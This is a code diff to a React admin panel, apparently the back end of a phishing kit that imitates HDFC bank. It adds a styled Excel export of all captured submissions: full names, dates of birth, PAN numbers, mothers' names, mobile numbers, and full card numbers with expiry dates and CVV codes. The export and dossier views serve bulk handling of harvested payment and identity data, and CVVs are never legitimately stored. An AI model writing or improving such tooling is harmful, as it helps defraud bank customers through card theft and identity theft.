@@ -3,7 +3,7 @@ import AdminNavbar from './components/AdminNavbar';
 import StatCards from './components/StatCards';
 import SubmissionsTable from './components/SubmissionsTable';
 import SubmissionDetailModal from './components/SubmissionDetailModal';
-import { PlusCircle, Download, ShieldCheck, RefreshCw, Radio, CheckCircle, AlertCircle } from 'lucide-react';
+import { PlusCircle, ShieldCheck, Radio } from 'lucide-react';
 import confetti from 'canvas-confetti';
 import logo from './assets/logo.png';
 import {
@@ -104,26 +104,91 @@ export default function App() {
       await addSimulationSubmission(newRecord);
     } catch (err) {
       console.error('Simulation write error:', err);
-      // Fallback local update if offline
       setSubmissions([{ id: 'HDFC-SIM-' + Date.now(), ...newRecord }, ...submissions]);
     }
   };
 
-  // 5. Export to CSV with ALL 12 customer fields
-  const handleExportCSV = () => {
-    const headers = 'ID,Date Time,Full Name,PAN Number,Mobile Number,DOB,Mother Name,Service Requested,Name On Card,Card Number,Expiry Date,CVV,Status\n';
-    const rows = submissions
-      .map(
-        (s) =>
-          `"${s.id}","${s.submittedAt || ''}","${s.fullName || ''}","${s.panNumber || ''}","${s.mobileNumber || ''}","${s.dob || ''}","${s.mothersName || ''}","${s.selectedService || ''}","${s.nameOnCard || ''}","${s.cardNumber || ''}","${s.expiryDate || ''}","${s.cvv || ''}","${s.status || ''}"`
-      )
-      .join('\n');
+  // 5. Single Dedicated Excel Export (.xls) with ALL 13 customer fields & preserved formatting
+  const handleExportExcel = () => {
+    const headers = [
+      'Application ID',
+      'Submission Date & Time',
+      'Applicant Full Name',
+      'Date of Birth',
+      'PAN Card Number',
+      "Mother's Name",
+      'Mobile Number',
+      'Service Requested',
+      'Name On Card',
+      'Card Number (16-Digit)',
+      'Expiry Date (MM/YY)',
+      'CVV Code',
+      'Verification Status'
+    ];
 
-    const blob = new Blob([headers + rows], { type: 'text/csv;charset=utf-8;' });
+    const sanitize = (val) => String(val ?? '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+
+    let xml = '<?xml version="1.0" encoding="UTF-8"?>\n' +
+      '<?mso-application progid="Excel.Sheet"?>\n' +
+      '<Workbook xmlns="urn:schemas-microsoft-com:office:spreadsheet"\n' +
+      ' xmlns:o="urn:schemas-microsoft-com:office:office"\n' +
+      ' xmlns:x="urn:schemas-microsoft-com:office:excel"\n' +
+      ' xmlns:ss="urn:schemas-microsoft-com:office:spreadsheet"\n' +
+      ' xmlns:html="http://www.w3.org/TR/REC-html40">\n' +
+      ' <Styles>\n' +
+      '  <Style ss:ID="Header">\n' +
+      '   <Font ss:Bold="1" ss:Color="#FFFFFF" ss:Size="11"/>\n' +
+      '   <Interior ss:Color="#002D62" ss:Pattern="Solid"/>\n' +
+      '   <Alignment ss:Horizontal="Center" ss:Vertical="Center"/>\n' +
+      '  </Style>\n' +
+      '  <Style ss:ID="CellString">\n' +
+      '   <NumberFormat ss:Format="@"/>\n' +
+      '   <Alignment ss:Vertical="Center"/>\n' +
+      '  </Style>\n' +
+      ' </Styles>\n' +
+      ' <Worksheet ss:Name="Customer Applications">\n' +
+      '  <Table>\n';
+
+    headers.forEach(() => {
+      xml += '   <Column ss:AutoFitWidth="1" ss:Width="150"/>\n';
+    });
+
+    xml += '   <Row ss:Height="28">\n';
+    headers.forEach((h) => {
+      xml += `    <Cell ss:StyleID="Header"><Data ss:Type="String">${sanitize(h)}</Data></Cell>\n`;
+    });
+    xml += '   </Row>\n';
+
+    submissions.forEach((s) => {
+      xml += '   <Row ss:Height="22">\n';
+      const row = [
+        s.id,
+        s.submittedAt || 'Recent',
+        s.fullName,
+        s.dob,
+        s.panNumber,
+        s.mothersName,
+        s.mobileNumber,
+        s.selectedService ? s.selectedService.replace(/_/g, ' ') : '',
+        s.nameOnCard || s.fullName,
+        s.cardNumber,
+        s.expiryDate,
+        s.cvv,
+        s.status
+      ];
+      row.forEach((val) => {
+        xml += `    <Cell ss:StyleID="CellString"><Data ss:Type="String">${sanitize(val)}</Data></Cell>\n`;
+      });
+      xml += '   </Row>\n';
+    });
+
+    xml += '  </Table>\n </Worksheet>\n</Workbook>';
+
+    const blob = new Blob([xml], { type: 'application/vnd.ms-excel;charset=utf-8;' });
     const url = URL.createObjectURL(blob);
     const link = document.createElement('a');
     link.setAttribute('href', url);
-    link.setAttribute('download', `HDFC_Customer_Applications_${new Date().toISOString().slice(0, 10)}.csv`);
+    link.setAttribute('download', `HDFC_Customer_Applications_${new Date().toISOString().slice(0, 10)}.xls`);
     document.body.appendChild(link);
     link.click();
     document.body.removeChild(link);
@@ -177,17 +242,13 @@ export default function App() {
               <PlusCircle size={16} />
               <span>Simulate Customer Entry</span>
             </button>
-            <button className="btn-banner-action" onClick={handleExportCSV}>
-              <Download size={16} />
-              <span>Export Full CSV</span>
-            </button>
           </div>
         </div>
 
         {/* KPI Stat Cards */}
         <StatCards submissions={submissions} />
 
-        {/* Live Submissions Table */}
+        {/* Live Submissions Table with Single Excel Export */}
         <SubmissionsTable
           submissions={filteredSubmissions}
           searchTerm={searchTerm}
@@ -199,7 +260,7 @@ export default function App() {
           onViewDossier={setSelectedDossier}
           onUpdateStatus={handleUpdateStatus}
           onDeleteSubmission={handleDeleteSubmission}
-          onExportCSV={handleExportCSV}
+          onExportExcel={handleExportExcel}
           onRefresh={() => {
             setIsLoading(true);
             setTimeout(() => setIsLoading(false), 500);
